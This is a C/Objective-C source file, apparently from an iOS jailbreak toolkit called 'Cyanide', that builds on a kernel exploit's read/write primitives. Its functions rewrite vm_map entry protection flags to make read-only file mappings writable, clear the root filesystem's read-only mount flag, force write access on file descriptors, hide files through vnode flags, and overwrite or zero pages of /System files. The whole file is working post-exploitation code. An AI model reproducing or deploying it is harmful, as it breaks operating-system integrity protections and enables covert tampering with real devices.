//
//  file.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#include "file.h"
#include "krw.h"
#include "offsets.h"
#include "vnode.h"
#include "kutils.h"
#include "xpaci.h"
#import "../kexploit/kexploit_opa334.h"

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

#define CYANIDE_DZ_PAGE_SIZE       0x4000ULL
#define CYANIDE_DZ_ENTRY_SAFE_BASE 0x30ULL
#define CYANIDE_DZ_ENTRY_FLAGS_OFF 0x48ULL
#define CYANIDE_DZ_FLAGS_OFF_IN_BUF (CYANIDE_DZ_ENTRY_FLAGS_OFF - CYANIDE_DZ_ENTRY_SAFE_BASE)
#define CYANIDE_DZ_FLAGS_PROT_SHIFT    7
#define CYANIDE_DZ_FLAGS_MAXPROT_SHIFT 11
#define CYANIDE_DZ_FLAGS_PROT_MASK     0x780ULL
#define CYANIDE_DZ_FLAGS_MAXPROT_MASK  0x7800ULL

static bool buffer_is_all_zero(const unsigned char *buf, size_t len) {
    if (!buf) return false;
    for (size_t i = 0; i < len; i++) {
        if (buf[i] != 0) return false;
    }
    return true;
}

static bool verify_file_page_zeroed(const char *path, off_t pageoff, size_t zerolen, const char *tag) {
    if (!path || zerolen == 0) return false;

    int verify_fd = open(path, O_RDONLY);
    if (verify_fd == -1) {
        printf("[%s] verify open(%s) failed: %s\n", tag, path, strerror(errno));
        return false;
    }

    unsigned char *verify = malloc(zerolen);
    if (!verify) {
        printf("[%s] verify malloc(%zu) failed for %s\n", tag, zerolen, path);
        close(verify_fd);
        return false;
    }

    bool ok = false;
    ssize_t got = pread(verify_fd, verify, zerolen, pageoff);
    if (got != (ssize_t)zerolen) {
        printf("[%s] verify pread(%s) got %zd/%zu: %s\n",
               tag, path, got, zerolen, got < 0 ? strerror(errno) : "short read");
    } else if (!buffer_is_all_zero(verify, zerolen)) {
        printf("[%s] verify failed: %s page offset %lld is not all zero\n",
               tag, path, (long long)pageoff);
    } else {
        ok = true;
    }

    free(verify);
    close(verify_fd);
    return ok;
}

static uint32_t dz_vm_map_nentries(uint64_t vm_map) {
    if (!is_kaddr_valid(vm_map) || !off_vm_map_hdr || !off_vm_map_header_nentries) {
        return 0;
    }
    return kread32(vm_map + off_vm_map_hdr + off_vm_map_header_nentries);
}

static bool dz_vm_map_is_sane(uint64_t vm_map) {
    uint32_t nentries = dz_vm_map_nentries(vm_map);
    return nentries > 0 && nentries < 100000;
}

static uint64_t dz_find_self_vm_map(uint64_t *task_out) {
    uint64_t task = task_self();
    if (is_kaddr_valid(task)) {
        uint64_t vm_map = task_get_vm_map(task);
        if (dz_vm_map_is_sane(vm_map)) {
            if (task_out) *task_out = task;
            printf("[ZERO-DZ] self task=%#llx vm_map=%#llx nentries=%u\n",
                   (unsigned long long)task,
                   (unsigned long long)vm_map,
                   dz_vm_map_nentries(vm_map));
            return vm_map;
        }
        printf("[ZERO-DZ] task_get_vm_map suspicious task=%#llx vm_map=%#llx nentries=%u\n",
               (unsigned long long)task,
               (unsigned long long)vm_map,
               dz_vm_map_nentries(vm_map));
    }

    uint64_t proc = proc_self();
    task = proc_task(proc);
    if (is_kaddr_valid(task)) {
        uint64_t vm_map = task_get_vm_map(task);
        if (dz_vm_map_is_sane(vm_map)) {
            if (task_out) *task_out = task;
            printf("[ZERO-DZ] proc task=%#llx vm_map=%#llx nentries=%u\n",
                   (unsigned long long)task,
                   (unsigned long long)vm_map,
                   dz_vm_map_nentries(vm_map));
            return vm_map;
        }
    }

    if (is_kaddr_valid(task)) {
        for (uint32_t off = 0x20; off <= 0x300; off += 8) {
            uint64_t candidate = kread_ptr(task + off);
            if (!dz_vm_map_is_sane(candidate)) continue;
            if (task_out) *task_out = task;
            printf("[ZERO-DZ] scanned vm_map=%#llx from task=%#llx+%#x nentries=%u\n",
                   (unsigned long long)candidate,
                   (unsigned long long)task,
                   off,
                   dz_vm_map_nentries(candidate));
            return candidate;
        }
    }

    printf("[ZERO-DZ] vm_map lookup failed proc=%#llx task=%#llx\n",
           (unsigned long long)proc,
           (unsigned long long)task);
    return 0;
}

static uint64_t dz_find_vm_map_entry(uint64_t vm_map, uint64_t uaddr,
                                     uint64_t *start_out, uint64_t *end_out) {
    if (!dz_vm_map_is_sane(vm_map) || !off_vm_map_header_links_next || !off_vm_map_entry_links_next) {
        printf("[ZERO-DZ] refusing entry lookup: bad vm_map/offsets vm_map=%#llx\n",
               (unsigned long long)vm_map);
        return 0;
    }

    uint64_t header = vm_map + off_vm_map_hdr;
    uint64_t entry = kread_ptr(header + off_vm_map_header_links_next);
    uint32_t nentries = dz_vm_map_nentries(vm_map);
    printf("[ZERO-DZ] scanning %u vm_map entries for mapped addr=%#llx\n",
           nentries, (unsigned long long)uaddr);

    for (uint32_t i = 0; i < nentries && i < 100000 && is_kaddr_valid(entry); i++) {
        uint64_t start = kread64(entry + 0x10);
        uint64_t end = kread64(entry + 0x18);
        if (start < end && uaddr >= start && uaddr < end) {
            if (start_out) *start_out = start;
            if (end_out) *end_out = end;
            printf("[ZERO-DZ] found entry=%#llx range=%#llx-%#llx\n",
                   (unsigned long long)entry,
                   (unsigned long long)start,
                   (unsigned long long)end);
            return entry;
        }
        uint64_t next = kread_ptr(entry + off_vm_map_entry_links_next);
        if (next == entry) break;
        entry = next;
    }

    printf("[ZERO-DZ] vm_map_entry not found for mapped addr=%#llx\n",
           (unsigned long long)uaddr);
    return 0;
}

static bool dz_patch_entry_protection(uint64_t entry) {
    if (!is_kaddr_valid(entry)) return false;

    uint8_t buf[0x20] = {0};
    kreadbuf(entry + CYANIDE_DZ_ENTRY_SAFE_BASE, buf, sizeof(buf));

    uint64_t flags = 0;
    memcpy(&flags, buf + CYANIDE_DZ_FLAGS_OFF_IN_BUF, sizeof(flags));

    uint64_t new_flags = flags;
    new_flags = (new_flags & ~CYANIDE_DZ_FLAGS_PROT_MASK) |
                ((uint64_t)(PROT_READ | PROT_WRITE) << CYANIDE_DZ_FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~CYANIDE_DZ_FLAGS_MAXPROT_MASK) |
                ((uint64_t)(PROT_READ | PROT_WRITE) << CYANIDE_DZ_FLAGS_MAXPROT_SHIFT);

    if (new_flags == flags) {
        printf("[ZERO-DZ] entry protections already writable flags=%#llx\n",
               (unsigned long long)flags);
        return true;
    }

    memcpy(buf + CYANIDE_DZ_FLAGS_OFF_IN_BUF, &new_flags, sizeof(new_flags));
    kwritebuf(entry + CYANIDE_DZ_ENTRY_SAFE_BASE, buf, sizeof(buf));

    uint64_t verify = kread64(entry + CYANIDE_DZ_ENTRY_FLAGS_OFF);
    bool ok = ((verify & CYANIDE_DZ_FLAGS_PROT_MASK) ==
               ((uint64_t)(PROT_READ | PROT_WRITE) << CYANIDE_DZ_FLAGS_PROT_SHIFT)) &&
              ((verify & CYANIDE_DZ_FLAGS_MAXPROT_MASK) ==
               ((uint64_t)(PROT_READ | PROT_WRITE) << CYANIDE_DZ_FLAGS_MAXPROT_SHIFT));
    printf("[ZERO-DZ] patch entry flags %#llx -> %#llx verify=%#llx ok=%d\n",
           (unsigned long long)flags,
           (unsigned long long)new_flags,
           (unsigned long long)verify,
           ok ? 1 : 0);
    return ok;
}

static int zero_system_file_page_dirtyzero_style(const char *path, off_t offset) {
    if (!path || offset < 0) {
        printf("[ZERO-DZ] invalid path or offset\n");
        return -1;
    }

    const size_t page_sz = CYANIDE_DZ_PAGE_SIZE;
    off_t pageoff = offset & ~((off_t)page_sz - 1);

    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[ZERO-DZ] open(%s) failed: %s\n", path, strerror(errno));
        return -1;
    }

    int rc = -1;
    off_t file_sz = lseek(fd, 0, SEEK_END);
    if (file_sz <= 0 || pageoff >= file_sz) {
        printf("[ZERO-DZ] invalid file size/offset for %s: size=%lld offset=%lld pageoff=%lld\n",
               path, (long long)file_sz, (long long)offset, (long long)pageoff);
        close(fd);
        return -1;
    }

    size_t zerolen = page_sz;
    if (pageoff + (off_t)zerolen > file_sz) {
        zerolen = (size_t)(file_sz - pageoff);
    }

    void *mapped = mmap(NULL, page_sz, PROT_READ, MAP_SHARED, fd, pageoff);
    if (mapped == MAP_FAILED) {
        printf("[ZERO-DZ] mmap(%s) failed: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }

    uint64_t task = 0;
    uint64_t vm_map = dz_find_self_vm_map(&task);
    if (!vm_map) goto out;

    uint64_t entry_start = 0;
    uint64_t entry_end = 0;
    uint64_t entry = dz_find_vm_map_entry(vm_map, (uint64_t)mapped, &entry_start, &entry_end);
    if (!entry) goto out;

    uint64_t mapped_end = (uint64_t)mapped + page_sz;
    if (entry_start > (uint64_t)mapped || entry_end < mapped_end) {
        printf("[ZERO-DZ] entry range too small for one-page map: mapped=%#llx-%#llx entry=%#llx-%#llx\n",
               (unsigned long long)mapped,
               (unsigned long long)mapped_end,
               (unsigned long long)entry_start,
               (unsigned long long)entry_end);
        goto out;
    }

    if (!dz_patch_entry_protection(entry)) goto out;

    memset(mapped, 0, zerolen);
    printf("[ZERO-DZ] zeroed mapped shared page path=%s offset=%lld pageoff=%lld len=%zu task=%#llx vm_map=%#llx entry=%#llx\n",
           path,
           (long long)offset,
           (long long)pageoff,
           zerolen,
           (unsigned long long)task,
           (unsigned long long)vm_map,
           (unsigned long long)entry);
    rc = 0;

out:
    munmap(mapped, page_sz);
    close(fd);

    if (rc == 0) {
        if (verify_file_page_zeroed(path, pageoff, zerolen, "ZERO-DZ")) {
            printf("[ZERO-DZ] verified %s page offset %lld is zeroed (%zu bytes)\n",
                   path, (long long)pageoff, zerolen);
            return 0;
        }
        printf("[ZERO-DZ] verification failed after dirtyZero-style write\n");
    }

    return -1;
}

uint64_t hide_path(const char* path) {
    uint64_t vnode = get_vnode_for_path_by_open(path);
    if(vnode == -1) {
        printf("[%s:%d] Unable to get vnode, path: %s", __FUNCTION__, __LINE__, path);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return vnode;
}

uint64_t reveal_path_by_vnode(uint64_t vnode) {
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //show file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

// Overwrite /System/... file data
uint64_t overwrite_system_file(char* to, char* from) {

    int to_fd = open(to, O_RDONLY);
    if (to_fd == -1) return -1;
    off_t to_file_sz = lseek(to_fd, 0, SEEK_END);
    
    int from_fd = open(from, O_RDONLY);
    if (from_fd == -1) return -1;
    off_t from_file_sz = lseek(from_fd, 0, SEEK_END);
    
    if(to_file_sz < from_file_sz) {
        close(from_fd);
        close(to_fd);
        printf("[%s:%d] File size is too big to overwrite!", __FUNCTION__, __LINE__);
        return -1;
    }
    
    uint64_t proc = proc_self();
    
    // get vnode
    uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t to_fileproc = kread64(fileprocPtrArr + (8 * to_fd));
    uint64_t to_fp_glob = kread64(to_fileproc + off_fileproc_fp_glob);
    to_fp_glob = xpaci(to_fp_glob);
    uint64_t to_vnode = kread64(to_fp_glob + off_fileglob_fg_data);
    to_vnode = xpaci(to_vnode);
    
    // unset read-only flag on rootfs
    uint64_t rootvnode_mount = kread64(get_rootvnode() + off_vnode_v_mount);
    rootvnode_mount = xpaci(rootvnode_mount);
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    
    // modify open flags to make writable
    uint32_t to_fg_flag = kread32(to_fp_glob + off_fileglob_fg_flag);
    kwrite32(to_fp_glob + off_fileglob_fg_flag, to_fg_flag | FWRITE);
    
    // to modify, increasing writecount needed
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
    }
    
    // modify file data
    void* from_mapped = mmap(NULL, from_file_sz, PROT_READ, MAP_PRIVATE, from_fd, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_fd);
        close(to_fd);
        return -1;
    }
    
    void* to_mapped = mmap(NULL, to_file_sz, PROT_READ | PROT_WRITE, MAP_SHARED, to_fd, 0);
    if (to_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (to_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    memcpy(to_mapped, from_mapped, from_file_sz);
    msync(to_mapped, to_file_sz, MS_SYNC);
    
    munmap(from_mapped, from_file_sz);
    munmap(to_mapped, to_file_sz);
    
    // restore open flags
    kwrite32(to_fp_glob + off_fileglob_fg_flag, to_fg_flag);
    // restore rootfs mount flag
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
    
    close(from_fd);
    close(to_fd);
    
    return 0;
}

static int zero_system_file_page_legacy(const char* path, off_t offset) {
    if (!path || offset < 0) {
        printf("[%s:%d] Invalid path or offset\n", __FUNCTION__, __LINE__);
        return -1;
    }

    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[%s:%d] open(%s) failed: %s\n",
               __FUNCTION__, __LINE__, path, strerror(errno));
        return -1;
    }

    off_t file_sz = lseek(fd, 0, SEEK_END);
    if (file_sz <= 0 || offset >= file_sz) {
        printf("[%s:%d] Invalid file size/offset for %s: size=%lld offset=%lld\n",
               __FUNCTION__, __LINE__, path, (long long)file_sz, (long long)offset);
        close(fd);
        return -1;
    }

    size_t page_sz = (size_t)getpagesize();
    off_t pageoff = offset & ~((off_t)page_sz - 1);
    size_t zerolen = page_sz;
    if (pageoff + (off_t)zerolen > file_sz) {
        zerolen = (size_t)(file_sz - pageoff);
    }

    uint64_t proc = proc_self();
    uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t fileproc = kread64(fileprocPtrArr + (8 * fd));
    uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
    fp_glob = xpaci(fp_glob);
    uint64_t vnode = kread64(fp_glob + off_fileglob_fg_data);
    vnode = xpaci(vnode);

    uint64_t rootvnode_mount = kread64(get_rootvnode() + off_vnode_v_mount);
    rootvnode_mount = xpaci(rootvnode_mount);
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    uint32_t fg_flag = kread32(fp_glob + off_fileglob_fg_flag);
    uint32_t vnode_writecount = kread32(vnode + off_vnode_v_writecount);
    bool bumped_writecount = ((int32_t)vnode_writecount <= 0);

    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    kwrite32(fp_glob + off_fileglob_fg_flag, fg_flag | FWRITE);
    if (bumped_writecount) {
        kwrite32(vnode + off_vnode_v_writecount, vnode_writecount + 1);
    }

    int rc = -1;
    void* mapped = mmap(NULL, page_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, pageoff);
    if (mapped == MAP_FAILED) {
        printf("[%s:%d] mmap(%s) failed: %s\n",
               __FUNCTION__, __LINE__, path, strerror(errno));
    } else {
        memset(mapped, 0, zerolen);
        if (msync(mapped, zerolen, MS_SYNC) == -1) {
            printf("[%s:%d] msync(%s) failed: %s\n",
                   __FUNCTION__, __LINE__, path, strerror(errno));
        } else {
            unsigned char *verify = malloc(zerolen);
            if (!verify) {
                printf("[%s:%d] verify malloc(%zu) failed for %s\n",
                       __FUNCTION__, __LINE__, zerolen, path);
            } else {
                ssize_t got = pread(fd, verify, zerolen, pageoff);
                if (got != (ssize_t)zerolen) {
                    printf("[%s:%d] verify pread(%s) got %zd/%zu: %s\n",
                           __FUNCTION__, __LINE__, path, got, zerolen,
                           got < 0 ? strerror(errno) : "short read");
                } else if (!buffer_is_all_zero(verify, zerolen)) {
                    printf("[%s:%d] verify failed: %s page offset %lld is not all zero after write\n",
                           __FUNCTION__, __LINE__, path, (long long)pageoff);
                } else {
                    printf("[ZERO] verified %s page offset %lld is zeroed (%zu bytes)\n",
                           path, (long long)pageoff, zerolen);
                    rc = 0;
                }
                free(verify);
            }
        }
        munmap(mapped, page_sz);
    }

    if (bumped_writecount) {
        kwrite32(vnode + off_vnode_v_writecount, vnode_writecount);
    }
    kwrite32(fp_glob + off_fileglob_fg_flag, fg_flag);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);

    close(fd);
    return rc;
}

int zero_system_file_page(const char* path, off_t offset) {
    int dz_rc = zero_system_file_page_dirtyzero_style(path, offset);
    if (dz_rc == 0) {
        return 0;
    }

    printf("[ZERO] DirtyZero-style page zero failed; falling back to legacy mmap/msync path.\n");
    return zero_system_file_page_legacy(path, offset);
}
